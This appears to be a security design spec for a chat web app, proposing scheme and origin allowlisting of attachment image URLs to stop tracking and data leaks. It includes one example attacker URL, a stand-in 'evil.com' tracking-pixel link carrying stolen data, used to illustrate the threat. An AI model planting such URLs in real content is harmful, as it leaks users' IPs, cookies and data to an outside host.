# Attachment URL Scheme & Origin Allowlist

## Problem Statement

`<img src={attachment.url}>` rendered without URL validation:
- `chat/room.tsx:1141-1144`
- `chat/index.tsx:872-875`

If server relays attacker-controlled URL (e.g., `http://evil.com/track.gif?stolen=...`):
- Browser fetches → IP/UA/cookies leak to attacker
- SSRF-from-client when on internal networks
- Tracking pixel privacy leak
- React HTML escape doesn't help (URL itself is the attack surface)

## Proposed Solution

Add client-side URL validation:
1. Allowlist scheme (`https:` only in production, `http:` for localhost dev)
2. Allowlist origin (configured via `VITE_ATTACHMENT_ALLOWED_ORIGINS` env)
3. Replace failed-validation with placeholder image / "Invalid attachment" UI
4. Server-side validation as authoritative defense (separate concern)

## Scope

- `resources/js/lib/attachment-url.ts` (new) — `isAllowedAttachmentUrl(url)` + `safeAttachmentUrl(url)` helpers
- `chat/room.tsx`, `chat/index.tsx` — use safe helper before render
- `.env.example` document the allowlist env var
- Tests for allowlist logic

## Out of Scope

- Server-side MIME / size / virus scan (Core API or upload service)
- Replacing base64 attachments (separate spec)
